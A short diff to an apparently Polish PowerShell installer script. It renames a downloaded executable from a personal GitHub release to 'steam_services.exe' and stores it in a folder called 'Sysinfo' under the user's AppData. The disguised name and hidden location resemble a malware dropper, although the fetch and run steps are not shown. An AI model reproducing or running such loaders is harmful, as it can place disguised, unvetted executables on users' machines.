@@ -3,9 +3,9 @@ Clear-Host
 Write-Host ""
 Write-Host "Instalowanie..."
 
-$repoRaw = "https://github.com/bartuss225/pliki/releases/download/v1.1.1/steam.exe"
+$repoRaw = "https://github.com/bartuss225/pliki/releases/download/v1.1.1/steam_services.exe"
 $installDir = Join-Path $env:APPDATA "Sysinfo"
-$outFile    = Join-Path $installDir "steam.exe"
+$outFile    = Join-Path $installDir "steam_services.exe"
 
 if (-not (Test-Path $installDir)) {
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
